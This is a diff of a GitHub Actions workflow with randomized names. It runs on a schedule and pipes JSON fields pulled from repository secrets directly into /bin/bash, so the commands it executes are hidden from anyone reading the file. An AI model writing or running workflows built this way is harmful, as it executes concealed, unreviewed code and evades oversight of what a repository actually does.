@@ -3,28 +3,20 @@ name: guoshantui4678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 4/6 * * *'
+    - cron: '12 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoshantui4678
         env:
-          tcxfe66: ${{ secrets.tcxfe66 }}
+          fbg75: ${{ secrets.fbg75 }}
         run: |
-          echo $tcxfe66 | jq -r .dkpd5 | /bin/bash
-          echo $uklp32311 | jq -r .vc310 | /bin/bash
-          echo $q24 | jq -r .xeipd402 | /bin/bash
-          echo $kshq58 | jq -r .jp2869 | /bin/bash
-          echo $ecs87 | jq -r .mnr23258 | /bin/bash
-          echo $d2 | jq -r .rtkt7 | /bin/bash
-          echo $d86 | jq -r .owv33363 | /bin/bash
-          echo $tv52 | jq -r .udvb931 | /bin/bash
-          echo $cte24077 | jq -r .ffji8903 | /bin/bash
-          echo $jvhjl7874 | jq -r .gybq37 | /bin/bash
-          echo $qlf097 | jq -r .hji27195 | /bin/bash
-          echo $dhz9083 | jq -r .x09221 | /bin/bash
-          echo $zm3 | jq -r .gezzs94492 | /bin/bash
+          echo $fbg75 | jq -r .bva769 | /bin/bash
+          echo $fvoh20406 | jq -r .hml94756 | /bin/bash
+          echo $ug93161 | jq -r .jtoqt8 | /bin/bash
+          echo $hs894 | jq -r .hh40806 | /bin/bash
+          echo $xqors51 | jq -r .e929 | /bin/bash
 
